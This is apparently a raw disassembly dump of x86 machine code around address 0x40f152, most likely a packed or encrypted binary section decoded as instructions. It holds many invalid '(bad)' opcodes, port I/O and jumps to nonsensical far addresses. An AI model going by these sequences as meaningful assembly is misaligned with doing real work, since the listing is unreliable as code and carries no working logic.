  40f152:	pop    eax
  40f153:	retf   
  40f154:	push   cs
  40f155:	(bad)  
  40f156:	out    dx,eax
  40f157:	push   edi
  40f158:	test   al,0xf
  40f15b:	or     eax,DWORD PTR [ecx+0x270e5c69]
  40f161:	(bad)  
  40f162:	fisttp DWORD PTR [edi-0x69]
  40f165:	(bad)  
  40f166:	out    0x67,eax
  40f168:	ins    BYTE PTR es:[edi],dx
  40f169:	jo     0x40f1cd
  40f16b:	or     DWORD PTR [ebx+0x5e],ecx
  40f16e:	ffree  st(5)
  40f170:	add    DWORD PTR [esi],esi
  40f172:	call   0x8c77:0x487fc87
  40f179:	repz inc esi
  40f17b:	imul   edx,DWORD PTR [ebp+ecx*8+0x9de3532],0xe8a8cd62
  40f186:	outs   dx,DWORD PTR ds:[esi]
  40f187:	rol    ecx,1
  40f189:	inc    DWORD PTR [eax-0x1f88ef65]
  40f18f:	inc    eax
  40f190:	jle    0x40f181
  40f192:	xor    BYTE PTR [edx-0x26821459],ch
  40f198:	nop
  40f199:	sbb    BYTE PTR [edi-0x75],dl
  40f19c:	clc    
  40f19d:	add    al,0xd1
  40f19f:	dec    edi
  40f1a0:	mov    ds:0xb5a47176,eax
  40f1a5:	jge    0x40f182
  40f1a7:	jb     0x40f1f2
  40f1a9:	call   0x96c8:0xb9d850f8
  40f1b0:	jg     0x40f151
  40f1b2:	xchg   DWORD PTR [edx+edi*1-0x4d6421e8],ecx
  40f1b9:	xor    BYTE PTR [edx],ch
  40f1bb:	pop    esp
  40f1bc:	pop    es
  40f1bd:	xor    DWORD PTR [ecx+0x383428cb],edi
  40f1c3:	test   DWORD PTR [edx-0xfa16272],edx
  40f1c9:	sbb    al,0x42
  40f1cb:	sub    DWORD PTR [ebx-0x203d05b4],edi
  40f1d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1d2:	cs ds xchg edx,eax
  40f1d5:	out    0x6d,eax
  40f1d7:	test   BYTE PTR [edx-0x3777f1ce],bh
  40f1dd:	fdivr  QWORD PTR [ebx+0x5f]
  40f1e0:	or     al,0xcb
  40f1e2:	out    dx,eax
  40f1e3:	outs   dx,DWORD PTR ds:[esi]
  40f1e4:	scas   al,BYTE PTR es:[edi]
  40f1e5:	mov    BYTE PTR [ebx],bh
  40f1e7:	call   0x4f87:0x6a6a0de3
  40f1ee:	iret   
  40f1ef:	js     0x40f1d8
  40f1f1:	enter  0x446b,0xeb
  40f1f5:	cs imul esp,DWORD PTR ds:[ebx],0x62
  40f1fa:	imul   edx,DWORD PTR [eax+0x12],0x1a91cf8c
  40f201:	shl    edi,1
  40f203:	or     BYTE PTR [eax-0x47597152],bh
  40f209:	fbstp  TBYTE PTR [eax-0x58]
  40f20c:	cmp    DWORD PTR [edx+0x73303614],eax
  40f212:	imul   ebx,DWORD PTR [edi+0x68c0ed9f],0x2810c691
  40f21c:	xchg   DWORD PTR [eax+0x18],edx
  40f21f:	pop    ds
  40f220:	jb     0x40f27b
  40f222:	int3   
  40f223:	sbb    ch,bl
  40f225:	xor    cl,BYTE PTR [edx+esi*1+0x22]
  40f229:	add    bl,BYTE PTR [edi]
  40f22b:	test   eax,0xee707d6d
  40f230:	cmp    esi,DWORD PTR [ebp+0x633725f4]
  40f236:	pop    ebp
  40f237:	repnz not BYTE PTR [eax+0x4f143cd0]
  40f23e:	mov    ecx,0x45571d6b
  40f243:	jecxz  0x40f269
  40f245:	sub    al,0xcd
  40f247:	lods   eax,DWORD PTR ds:[esi]
  40f248:	xchg   DWORD PTR [edx+edi*8+0x264f3f8],edi
  40f24f:	xlat   BYTE PTR ds:[ebx]
  40f250:	ins    DWORD PTR es:[edi],dx
  40f251:	test   DWORD PTR [ebx+eiz*2-0x80],esp
  40f255:	adc    esi,DWORD PTR [ebp+0x76]
  40f258:	jnp    0x40f2b5
  40f25a:	xor    BYTE PTR [eax],0xc9
  40f25d:	pop    ebp
  40f25e:	leave  
  40f25f:	xchg   DWORD PTR [ecx],ebx
  40f261:	cwde   
  40f262:	xor    al,0x84
  40f264:	mov    ebx,0xf711ba2c
  40f269:	mov    eax,ds:0x6dcb7ebc
  40f26e:	ss pop ds
  40f270:	popa   
  40f271:	mov    eax,ds:0x4a705b8a
  40f276:	lahf   
  40f277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f278:	inc    esi
  40f279:	ins    BYTE PTR es:[edi],dx
  40f27a:	imul   edi,ebp,0xb347ca89
  40f280:	jecxz  0x40f236
  40f282:	ret    
  40f283:	add    DWORD PTR [edx+esi*8-0x1c3f6cb0],edx
  40f28a:	out    0x10,al
  40f28c:	rcl    DWORD PTR [edx+0x601d3d11],0xd9
  40f293:	jmp    0x40f254
  40f295:	aad    0xef
  40f297:	fidiv  DWORD PTR [ebx+esi*4]
  40f29a:	mov    cl,0x5d
  40f29c:	pop    ecx
  40f29d:	addr16 mov ebp,0x8e3656d3
  40f2a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2a4:	in     eax,0xf3
  40f2a6:	add    edi,ecx
  40f2a8:	mov    ah,0x1f
  40f2aa:	dec    esp
  40f2ab:	add    ah,BYTE PTR ds:0x4349395
  40f2b1:	mov    dl,0x1f
  40f2b3:	xchg   ebx,eax
  40f2b4:	and    eax,0x53c38aa0
  40f2b9:	stos   BYTE PTR es:[edi],al
  40f2ba:	(bad)  
  40f2bb:	inc    ebp
  40f2bc:	jae    0x40f2e2
  40f2be:	dec    edx
  40f2bf:	cli    
  40f2c0:	adc    esp,DWORD PTR [ebp+0x54]
  40f2c3:	rcl    esp,cl
  40f2c5:	or     BYTE PTR ds:0x409ac2c5,bl
  40f2cb:	pop    ds
  40f2cc:	data16 je 0x40f2ee
  40f2cf:	pop    ebp
  40f2d0:	jne    0x40f275
  40f2d2:	or     eax,0xff716ecf
  40f2d7:	scas   eax,DWORD PTR es:[edi]
  40f2d8:	int    0xbe
  40f2da:	dec    ecx
  40f2db:	jne    0x40f355
  40f2dd:	adc    eax,0xd479df8
  40f2e2:	jg     0x40f317
  40f2e4:	or     DWORD PTR [eax],esi
  40f2e6:	sbb    BYTE PTR [ebx+0xc9504d7],bh
  40f2ec:	ds push ds
  40f2ee:	addr16 es in eax,0x3e
  40f2f2:	xchg   BYTE PTR [eax],bh
  40f2f4:	(bad)  
  40f2f5:	lock rol DWORD PTR [eax+0x4036be57],cl
  40f2fc:	push   ebp
  40f2fd:	xchg   edi,eax
  40f2fe:	adc    BYTE PTR [ecx],al
  40f300:	mov    edx,0xb60e9993
  40f305:	pop    eax
  40f306:	jne    0x40f360
  40f308:	icebp  
  40f309:	scas   al,BYTE PTR es:[edi]
  40f30a:	iret   
  40f30b:	ins    BYTE PTR es:[edi],dx
  40f30c:	fidivr WORD PTR [esi]
  40f30e:	test   al,0x8c
  40f310:	jl     0x40f2ba
  40f312:	and    BYTE PTR [edx-0x48],dh
  40f315:	jne    0x40f2e8
  40f317:	mov    bl,0xcf
  40f319:	mov    bl,BYTE PTR [edx+0xade57e]
  40f31f:	or     ebx,DWORD PTR [edx+0x6f]
  40f322:	aaa    
  40f323:	ja     0x40f342
  40f325:	add    eax,0x86feaa7
  40f32a:	iret   
  40f32b:	cld    
  40f32c:	fs inc eax
  40f32e:	jbe    0x40f308
  40f330:	and    bh,BYTE PTR [edx]
  40f332:	bound  ecx,QWORD PTR [edx+0x79]
  40f335:	and    al,0x90
  40f337:	(bad)  
  40f338:	cli    
  40f339:	cmp    DWORD PTR [ebx],eax
  40f33b:	and    ch,BYTE PTR [eax]
  40f33d:	fnstenv [ebp+0x1a]
  40f340:	and    esi,edi
  40f342:	loope  0x40f348
  40f344:	retf   
  40f345:	mov    ebx,0x1fbc886e
  40f34a:	shr    BYTE PTR [edi],cl
  40f34c:	xchg   DWORD PTR [ecx+edx*8+0x7a],ebp
  40f350:	ins    DWORD PTR es:[edi],dx
  40f351:	cmp    edx,0xffffffcd
  40f354:	mov    ch,0x61
  40f356:	push   ss
  40f357:	cmp    eax,0x33378757
  40f35c:	mov    al,ds:0xe8cd9a5a
  40f361:	loop   0x40f37d
  40f363:	fidiv  WORD PTR [esi]
  40f365:	js     0x40f3c3
  40f367:	add    ebp,ecx
  40f369:	mov    ds:0x8acd77fc,eax
  40f36e:	xlat   BYTE PTR ds:[ebx]
  40f36f:	push   es
  40f370:	sar    BYTE PTR [esi],cl
  40f372:	adc    edi,edx
  40f374:	stc    
  40f375:	call   0x74b869c6
  40f37a:	test   DWORD PTR [esi-0x71],ebp
  40f37d:	jmp    0x40f3fc
  40f37f:	sub    al,0xf2
  40f381:	sub    al,BYTE PTR [edx-0x6b]
  40f384:	icebp  
  40f385:	push   0xdd9e2bfd
  40f38a:	dec    eax
  40f38b:	stos   BYTE PTR es:[edi],al
  40f38c:	(bad)  
  40f38d:	sahf   
  40f38e:	push   eax
  40f38f:	les    ecx,FWORD PTR [ebx+0x1f]
  40f392:	int    0xed
  40f394:	xchg   edx,eax
  40f395:	(bad)
  40f398:	jge    0x40f35b
  40f39a:	adc    eax,0x19d85560
  40f39f:	push   edx
  40f3a0:	dec    edx
  40f3a1:	enter  0xc523,0xc8
  40f3a5:	mov    esp,0xeae45fa2
  40f3aa:	in     al,0xe7
  40f3ac:	into   
  40f3ad:	test   eax,0x5a06de
  40f3b2:	int    0xdc
  40f3b4:	loope  0x40f3d0
  40f3b6:	cli    
  40f3b7:	jno    0x40f339
  40f3b9:	push   0x10
  40f3bb:	adc    dl,BYTE PTR [ebp+0x1f]
  40f3be:	jmp    0x40f36c
  40f3c0:	inc    ebp
  40f3c1:	mov    ch,0x20
  40f3c3:	scas   al,BYTE PTR es:[edi]
  40f3c4:	inc    ebp
  40f3c5:	or     al,0xe4
  40f3c7:	inc    edi
  40f3c8:	ss push ebx
  40f3ca:	cs iret 
  40f3cc:	mov    dh,0x7d
  40f3ce:	imul   edx,DWORD PTR [ebp+0x41],0xffffff8d
  40f3d2:	cmp    DWORD PTR [edi-0x7],eax
  40f3d5:	lahf   
  40f3d6:	ror    BYTE PTR [ecx],0x74
  40f3d9:	add    dh,BYTE PTR [esi-0x52385da4]
  40f3df:	mov    bl,dh
  40f3e1:	idiv   DWORD PTR [ecx]
  40f3e3:	lods   eax,DWORD PTR ds:[esi]
  40f3e4:	sbb    cl,bl
  40f3e6:	cmp    ebp,edi
  40f3e8:	ss shl edx,0x95
  40f3ec:	mov    dl,0xde
  40f3ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3ef:	jnp    0x40f386
  40f3f1:	xor    al,0x99
  40f3f3:	push   es
  40f3f4:	and    bh,BYTE PTR [ecx+0x41]
  40f3f7:	fsubr  DWORD PTR [edx-0x3b]
  40f3fa:	mov    ?,WORD PTR [ebx-0x5dbbeb7f]
  40f400:	rcr    edi,0x78
  40f403:	adc    BYTE PTR [ecx+0x5c],bh
  40f406:	xor    esi,DWORD PTR [ebp+ebx*8+0x6c852bd0]
  40f40d:	push   eax
  40f40e:	adc    eax,0x70a79fc4
  40f413:	shr    DWORD PTR [esi+0x8],1
  40f416:	xchg   ebx,eax
  40f417:	add    al,0xb6
  40f419:	ss ja  0x40f3f2
  40f41c:	add    al,0xad
  40f41e:	cmp    eax,0xb115d421
  40f423:	and    ch,BYTE PTR [ebx+esi*8]
  40f426:	xor    edi,DWORD PTR [esi-0xe]
  40f429:	dec    ebx
  40f42a:	xor    esi,esp
  40f42c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40f42e:	inc    ebx
  40f42f:	push   0x9ebf41c6
  40f434:	cmp    edx,0x3b
  40f437:	je     0x40f4b7
  40f439:	mov    ebx,0xece05859
  40f43e:	jb     0x40f4bf
  40f440:	xchg   ebx,eax
  40f441:	in     al,0xaf
  40f443:	jl     0x40f4bd
  40f445:	js     0x40f470
  40f447:	fidiv  WORD PTR [eax-0x1af926cd]
  40f44d:	popa   
  40f44e:	push   esp
  40f44f:	cmc    
  40f450:	cmp    eax,0xec6b2617
  40f455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f456:	and    DWORD PTR [ecx-0x2a3669b4],0x6f
  40f45d:	pop    esp
  40f45e:	test   dh,ah
  40f460:	fdiv   st,st(3)
  40f462:	dec    ebx
  40f463:	jns    0x40f405
  40f465:	jmp    0x40f4d7
  40f467:	les    ebp,FWORD PTR [ecx]
  40f469:	cmp    al,0xe5
  40f46b:	sbb    dh,BYTE PTR [ebx+0x2d9b4128]
  40f471:	or     bl,bh
  40f473:	outs   dx,BYTE PTR ds:[esi]
  40f474:	mov    ah,0x87
  40f476:	adc    BYTE PTR [eax-0x4e],al
  40f479:	in     al,dx
  40f47a:	inc    esp
  40f47b:	add    eax,0x9769778a
  40f480:	and    al,0xb7
  40f482:	ficom  WORD PTR [esi-0x2927c1bc]
  40f488:	add    eax,0x855b7c12
  40f48d:	std    
  40f48e:	sub    cl,BYTE PTR [edi-0x31]
  40f491:	out    0x55,eax
  40f493:	mov    edi,0xd9b3388b
  40f498:	fwait
  40f499:	add    BYTE PTR [edx+esi*8-0x4220a5f1],0x1a
  40f4a1:	mov    ah,0x44
  40f4a3:	sub    eax,0xa9a92985
  40f4a8:	pop    ebx
  40f4a9:	cmp    al,0x68
  40f4ab:	enter  0x2d3a,0xa2
  40f4af:	gs loope 0x40f46b
  40f4b2:	pop    ss
  40f4b3:	jge    0x40f515
  40f4b5:	sub    BYTE PTR [edx+0x13132b4c],0xac
  40f4bc:	jbe    0x40f510
  40f4be:	aaa    
  40f4bf:	or     ebp,DWORD PTR [eax+0x68]
  40f4c2:	xchg   edi,eax
  40f4c3:	xchg   ebx,eax
  40f4c4:	cld    
  40f4c5:	in     al,0x59
  40f4c7:	xchg   ecx,eax
  40f4c8:	sbb    eax,0xe29d4e02
  40f4cd:	xor    DWORD PTR [ecx],eax
  40f4cf:	(bad)  ds:0x7a7c756
  40f4d5:	xor    al,0xe5
  40f4d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4d8:	enter  0xecee,0x5f
  40f4dc:	or     eax,0xb0e64a1e
  40f4e1:	and    al,0x9f
  40f4e3:	pop    esi
  40f4e4:	jl     0x40f523
  40f4e6:	jmp    0x7c04af5d
  40f4eb:	in     eax,0x70
  40f4ed:	and    bl,BYTE PTR [ecx]
  40f4ef:	aad    0xc8
  40f4f1:	retf   
  40f4f2:	push   edx
  40f4f3:	jmp    0xab9a5b1b
  40f4f8:	xchg   DWORD PTR [ecx],edx
  40f4fa:	lods   al,BYTE PTR ds:[esi]
  40f4fb:	aaa    
  40f4fc:	adc    dh,al
  40f4fe:	mov    ds:0x25e50a08,eax
  40f503:	aam    0x8
  40f505:	es jmp 0x57cf:0x4bb613f4
  40f50d:	loopne 0x40f523
  40f50f:	iret   
  40f510:	pop    edx
  40f511:	js     0x40f50c
  40f513:	jl     0x40f548
  40f515:	xor    al,0x91
  40f517:	clc    
  40f518:	sub    eax,esp
  40f51a:	xchg   esi,eax
  40f51b:	outs   dx,BYTE PTR ds:[esi]
  40f51c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f51d:	jns    0x40f55b
  40f51f:	xor    BYTE PTR [esp+esi*2+0x7d],0x59
  40f524:	lahf   
  40f525:	jp     0x40f4ef
  40f527:	fs push ebp
  40f529:	ss test eax,0xc668e421
  40f52f:	lods   eax,DWORD PTR ds:[esi]
  40f530:	adc    BYTE PTR ds:0x3c76b877,dl
  40f536:	cld    
  40f537:	jecxz  0x40f4ff
  40f539:	add    DWORD PTR [esi],ebx
  40f53b:	push   eax
  40f53c:	loopne 0x40f536
  40f53e:	mov    ds:0xac39d65d,eax
  40f543:	adc    BYTE PTR [edx],bh
  40f545:	pop    eax
  40f546:	or     DWORD PTR [esi-0x7bd57c62],edi
  40f54c:	add    eax,0xae57ab62
  40f551:	push   ss
  40f552:	rcr    DWORD PTR [ebp+0x3c728477],cl
  40f558:	mov    ebx,0x6efceb32
  40f55d:	adc    eax,esp
  40f55f:	add    ah,dl
  40f561:	rol    BYTE PTR [edx],0x3c
  40f564:	lahf   
  40f565:	loopne 0x40f51a
  40f567:	aas    
  40f568:	or     al,ch
  40f56a:	out    dx,eax
  40f56b:	sub    ebp,ecx
  40f56d:	fidivr WORD PTR [esi-0x592e08f9]
  40f573:	mov    ds:0xb8cd6b39,al
  40f578:	ret    0x7757
  40f57b:	jae    0x40f504
  40f57d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f57e:	or     al,0x14
  40f580:	scas   eax,DWORD PTR es:[edi]
  40f581:	fstp   QWORD PTR [eax+edi*8+0xc]
  40f585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f586:	push   ebp
  40f587:	fdivr  st(2),st
  40f589:	adc    DWORD PTR [eax+0x12],ebx
  40f58c:	lods   al,BYTE PTR ds:[esi]
  40f58d:	or     al,0x5c
  40f58f:	arpl   di,ax
  40f591:	std    
  40f592:	push   edx
  40f593:	es int3 
  40f595:	shr    BYTE PTR [ecx],1
  40f597:	adc    BYTE PTR [ecx-0x7bc0a1f8],ch
  40f59d:	ss jne 0x40f604
  40f5a0:	jmp    0x3a17c664
  40f5a5:	test   ebx,ecx
  40f5a7:	in     al,dx
  40f5a8:	adc    eax,0x7fcee01
  40f5ad:	xchg   ecx,eax
  40f5ae:	xchg   edi,eax
  40f5af:	outs   dx,BYTE PTR ds:[esi]
  40f5b0:	pop    es
  40f5b1:	sub    edx,ebp
  40f5b3:	test   al,0x7
  40f5b5:	sbb    esp,DWORD PTR [esi]
  40f5b7:	mov    ebx,0xf9996e01
  40f5bc:	fidivr WORD PTR [ebx-0x6c]
  40f5bf:	mov    dh,0x68
  40f5c1:	pop    eax
  40f5c2:	pop    esi
  40f5c3:	adc    BYTE PTR ds:0x14530d99,cl
  40f5c9:	mov    ebx,0x28b3faab
  40f5ce:	mov    edi,0xdceb554d
  40f5d3:	ret    
  40f5d4:	and    eax,0xc4124eb0
  40f5d9:	mov    ecx,0x556326c
  40f5de:	shl    BYTE PTR ds:[edx-0x6df379e6],1
  40f5e5:	mov    dh,0xf1
  40f5e7:	icebp  
  40f5e8:	rcr    ebx,1
  40f5ea:	aaa    
  40f5eb:	outs   dx,DWORD PTR ds:[esi]
  40f5ec:	mov    cl,0x4e
  40f5ee:	fucomip st,st(7)
  40f5f0:	xor    ebp,DWORD PTR ds:[eax-0x24148a08]
  40f5f7:	xchg   esp,eax
  40f5f8:	xchg   ecx,eax
  40f5f9:	sbb    dl,dl
  40f5fb:	xchg   edx,eax
  40f5fc:	stos   BYTE PTR es:[edi],al
  40f5fd:	cmp    ch,BYTE PTR [edi+edx*4+0x13]
  40f601:	jecxz  0x40f5e2
  40f603:	sub    DWORD PTR [ebx+0x22f9bbcf],0xffffffe7
  40f60a:	test   DWORD PTR [ebx],ebp
  40f60c:	inc    eax
  40f60d:	scas   eax,DWORD PTR es:[edi]
  40f60e:	mov    ebx,0x9188bfe4
  40f613:	sbb    BYTE PTR fs:[ebx],ah
  40f616:	jg     0x40f61d
  40f618:	add    dh,BYTE PTR [esp+ecx*4-0x7f]
  40f61c:	mov    DWORD PTR [ecx+0x3ab8aa6e],ebp
  40f622:	dec    esi
  40f623:	test   DWORD PTR [edi-0x528c8309],0xae85d43f
  40f62d:	dec    ebx
  40f62e:	outs   dx,DWORD PTR ds:[esi]
  40f62f:	add    DWORD PTR [ecx+0xc],esp
  40f632:	xchg   esp,eax
  40f633:	jmp    0x2f5d:0x44426790
  40f63a:	sub    eax,0x206c8977
  40f63f:	and    BYTE PTR [ebx],ah
  40f641:	push   0x53
  40f643:	ins    DWORD PTR es:[edi],dx
  40f644:	add    bh,BYTE PTR [edx-0x10fdda99]
  40f64a:	ss jmp 0x40f605
  40f64d:	jnp    0x40f633
  40f64f:	and    eax,DWORD PTR [eax]
  40f651:	loope  0x40f5e1
  40f653:	ret    0x36d7
  40f656:	(bad)  
  40f657:	pop    esp
  40f658:	mov    al,BYTE PTR [eax-0x53c240a8]
  40f65e:	out    0xb3,al
  40f660:	sub    BYTE PTR [edx+esi*2-0x3f],ch
  40f664:	and    eax,0x337c0194
  40f669:	cmp    DWORD PTR [esi-0x8],esp
  40f66c:	pop    eax
  40f66d:	jno    0x40f643
  40f66f:	cmp    ch,BYTE PTR [ebx]
  40f671:	dec    esp
  40f673:	mov    esi,0x7fb1c932
  40f678:	xor    al,0x6d
  40f67a:	jbe    0x40f68c
  40f67c:	inc    ecx
  40f67d:	inc    esi
  40f67e:	(bad)  
  40f680:	pop    es
  40f681:	inc    esi
  40f682:	add    dl,BYTE PTR [esi+eiz*2]
  40f685:	adc    DWORD PTR [edi+0x1aac997c],ecx
  40f68b:	sbb    ch,BYTE PTR [esi]
  40f68d:	arpl   WORD PTR [ebp+esi*2+0x40],dx
  40f691:	sub    edi,eax
  40f693:	xor    bh,BYTE PTR [ebp-0x75]
  40f696:	pop    ss
  40f697:	mov    ds:0x30a00f93,eax
  40f69c:	inc    edx
  40f69d:	push   ss
  40f69e:	stos   DWORD PTR es:[edi],eax
  40f69f:	pop    es
  40f6a0:	xchg   esp,eax
  40f6a1:	add    DWORD PTR [ecx],edi
  40f6a3:	dec    esi
  40f6a4:	and    DWORD PTR [ecx+0x66],0x36
  40f6a8:	gs xchg esi,eax
  40f6aa:	fwait
  40f6ab:	jge    0x40f6a1
  40f6ad:	dec    esi
  40f6ae:	clc    
  40f6af:	in     al,dx
  40f6b0:	xchg   DWORD PTR [esi],ebp
  40f6b2:	pop    esi
  40f6b3:	xor    ebp,DWORD PTR [edx-0x28]
  40f6b6:	add    eax,0x84d43faa
  40f6bb:	jns    0x40f6bc
  40f6bd:	push   0x5c4a2fd3
  40f6c2:	push   edx
  40f6c3:	nop
  40f6c4:	xor    eax,esi
  40f6c6:	jns    0x40f70c
  40f6c8:	or     bl,BYTE PTR [ecx-0x7cd85962]
  40f6ce:	cmp    edx,DWORD PTR [ecx]
  40f6d0:	xor    al,0x14
  40f6d2:	outs   dx,DWORD PTR ds:[esi]
  40f6d3:	inc    ebp
  40f6d4:	mov    ebx,0x6e0d08a8
  40f6d9:	mov    DWORD PTR [ecx-0x48],esi
  40f6dc:	out    0x15,eax
  40f6de:	pushf  
  40f6df:	jmp    0xa27fde27
  40f6e4:	(bad)  
  40f6e5:	sahf   
  40f6e6:	mov    DWORD PTR [ebp+0x6],ebp
  40f6e9:	jmp    0x32ec:0xeda39220
  40f6f0:	adc    al,0x6a
  40f6f2:	or     eax,DWORD PTR [eax-0x61]
  40f6f5:	push   ebp
  40f6f6:	xchg   edx,eax
  40f6f7:	sahf   
  40f6f8:	sbb    BYTE PTR [edi],0x2d
  40f6fb:	pushf  
  40f6fc:	adc    al,0xc6
  40f6fe:	xchg   edi,eax
  40f6ff:	lahf   
  40f700:	scas   al,BYTE PTR es:[edi]
  40f701:	sbb    BYTE PTR [ebx],bh
  40f703:	cmp    ah,0x58
  40f706:	mov    bl,0x9
  40f708:	mov    bh,0x3c
  40f70a:	pusha  
  40f70b:	daa    
  40f70c:	add    al,BYTE PTR [esi-0x7]
  40f70f:	push   0xffffffe1
  40f711:	gs sub al,0x94
  40f714:	xchg   BYTE PTR [eax],ch
  40f716:	xchg   BYTE PTR [ecx-0x26],bh
  40f719:	cmp    eax,0x1862807c
  40f71e:	rol    bh,cl
  40f720:	cmp    ebx,DWORD PTR [edi-0x207c30b4]
  40f726:	mov    dl,0x6a
  40f728:	sar    DWORD PTR [eax-0x73],1
  40f72b:	xchg   DWORD PTR [ecx-0x65],ebx
  40f72e:	push   esi
  40f72f:	and    edx,DWORD PTR ds:0xd743202
  40f735:	xor    ecx,DWORD PTR [ebp-0x70]
  40f738:	pop    esp
  40f739:	iret   
  40f73a:	fs int3 
  40f73c:	in     al,dx
  40f73d:	sar    BYTE PTR [eax+0x4d],1
  40f740:	mov    bl,BYTE PTR [esi+0x17]
  40f743:	sbb    BYTE PTR [esi],0xc1
  40f746:	inc    eax
  40f747:	leave  
  40f748:	cmp    bh,BYTE PTR [ebx]
  40f74a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f74b:	add    al,0xdc
  40f74d:	xchg   ebp,eax
  40f74e:	or     eax,0xbe8ed0a6
  40f753:	mov    BYTE PTR [eax+0x65],dh
  40f756:	icebp  
  40f757:	push   eax
  40f758:	lahf   
  40f759:	mov    edi,ds
  40f75b:	pop    ecx
  40f75c:	add    esi,DWORD PTR [esi-0x38c21f03]
  40f762:	push   esi
  40f763:	lods   al,BYTE PTR ds:[esi]
  40f764:	div    BYTE PTR [ecx+0x2f15d8e1]
  40f76a:	arpl   WORD PTR [ecx-0x35730835],dx
  40f770:	das    
  40f771:	mov    DWORD PTR ds:0x86e09e15,esi
  40f777:	clc    
  40f778:	mov    edx,0xafe80958
  40f77d:	mov    bl,0x69
  40f77f:	push   0xffffffea
  40f781:	fs jge 0x40f77c
  40f784:	lods   al,BYTE PTR ds:[esi]
  40f785:	jb     0x40f78c
  40f787:	loope  0x40f745
  40f789:	(bad)  
  40f78a:	or     ebx,DWORD PTR [ebx]
  40f78c:	sub    eax,0xa62f91ce
  40f791:	mov    DWORD PTR [edx+0x45],ecx
  40f794:	stos   BYTE PTR es:[edi],al
  40f795:	or     eax,0x50fd0d8f
  40f79a:	sub    al,0xa5
  40f79c:	std    
  40f79d:	inc    eax
  40f79e:	or     BYTE PTR [edi-0x10],cl
  40f7a1:	fild   QWORD PTR [ecx+0x27]
  40f7a4:	popf   
  40f7a5:	push   0x69b2af65
  40f7aa:	mov    eax,DWORD PTR [edi-0x7c2f3b01]
  40f7b0:	mov    ah,0x2f
  40f7b2:	sbb    DWORD PTR ds:0x57797af0,edx
  40f7b8:	jno    0x40f7d5
  40f7ba:	stc    
  40f7bb:	nop
  40f7bc:	test   BYTE PTR [ebx],dl
  40f7be:	loop   0x40f75c
  40f7c0:	and    al,0x1c
  40f7c2:	pop    DWORD PTR [esi]
  40f7c4:	adc    eax,edi
  40f7c6:	dec    edi
  40f7c7:	or     al,0x65
  40f7c9:	in     eax,0x88
  40f7cb:	mov    ds:0x91f26368,al
  40f7d0:	test   BYTE PTR [esi-0x5f],0xf6
  40f7d4:	lods   al,BYTE PTR ds:[esi]
  40f7d5:	push   es
  40f7d6:	jbe    0x40f759
  40f7d8:	pop    ebp
  40f7d9:	shl    DWORD PTR [esi+ecx*8+0x7f],cl
  40f7dd:	sbb    al,0x83
  40f7df:	aaa    
  40f7e0:	loope  0x40f7da
  40f7e2:	fcmovu st,st(2)
  40f7e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7e5:	xchg   edi,eax
  40f7e6:	dec    esi
  40f7e7:	(bad)  
  40f7e9:	xchg   ebx,eax
  40f7ea:	aas    
  40f7eb:	xchg   esi,eax
  40f7ec:	fxch   st(6)
  40f7ee:	add    ah,al
  40f7f0:	jmp    FWORD PTR [esi]
  40f7f2:	push   ecx
  40f7f3:	leave  
  40f7f4:	xchg   BYTE PTR [ebx],dh
  40f7f6:	mov    dl,0x2b
  40f7f8:	dec    esp
  40f7f9:	jns    0x40f7f1
  40f7fb:	jmp    0x40f800
	...
  40f83c:	add    BYTE PTR [eax],al
  40f83e:	add    BYTE PTR [ecx],dl
  40f840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f841:	pop    esi
  40f842:	xor    eax,0xa57bfffe
  40f847:	int    0xa1
  40f849:	ficom  WORD PTR [esi+edi*4+0x24]
  40f84d:	mov    ds:0xfe4e0a,eax
  40f852:	add    BYTE PTR ds:0x9f000007,ah
  40f858:	(bad)  
  40f859:	fistp  DWORD PTR [edx-0x4a44ccbe]
  40f85f:	xor    ebx,0x9dc90e49
  40f865:	adc    BYTE PTR [ebx],ch
  40f867:	jb     0x40f838
  40f869:	cmp    DWORD PTR [ecx-0x85490ad],eax
  40f86f:	shl    DWORD PTR [esi-0x38],cl
  40f872:	xchg   ebx,eax
  40f873:	sub    esi,DWORD PTR [ebp+0x1f]
  40f876:	jbe    0x40f8ea
  40f878:	xor    eax,0x9b0855d9
  40f87d:	xchg   ebx,eax
  40f87e:	inc    ebp
  40f87f:	shr    DWORD PTR [edi+0x7],0xa7
  40f883:	dec    eax
  40f884:	push   0xffffffbe
  40f886:	fmul   QWORD PTR [ebp+0x59ede5b7]
  40f88c:	shl    BYTE PTR [ecx],0xab
  40f88f:	rcl    DWORD PTR [edx-0x662b9d6f],1
  40f895:	add    DWORD PTR [ebx-0x29],edi
  40f898:	and    ebp,ecx
  40f89a:	inc    edi
  40f89b:	jb     0x40f8b6
  40f89d:	pushf  
  40f89e:	mov    bl,0xfd
  40f8a0:	mov    dh,0x82
  40f8a2:	mov    edi,0xdad8d418
  40f8a7:	and    ah,BYTE PTR [edi+0x52537843]
  40f8ad:	sub    edx,edx
  40f8af:	call   0x5f9df6ad
  40f8b4:	dec    edi
  40f8b5:	stos   BYTE PTR es:[edi],al
  40f8b6:	pop    ebx
  40f8b7:	jge    0x40f915
  40f8b9:	adc    eax,0x8ff21189
  40f8be:	xchg   ch,ah
  40f8c0:	or     ch,bh
  40f8c2:	and    esp,DWORD PTR [edi-0x55ce4dcb]
  40f8c8:	push   esp
  40f8c9:	sbb    bl,BYTE PTR [ebp-0x38]
  40f8cc:	xchg   esi,eax
  40f8cd:	nop
  40f8ce:	cmc    
  40f8cf:	push   esi
  40f8d0:	frndint 
  40f8d2:	out    0xea,eax
  40f8d4:	mov    cl,0x42
  40f8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8d7:	sub    BYTE PTR [ebp-0x5d],al
  40f8da:	ins    DWORD PTR es:[edi],dx
  40f8db:	nop
  40f8dc:	fist   DWORD PTR [eax-0x2e69c0c]
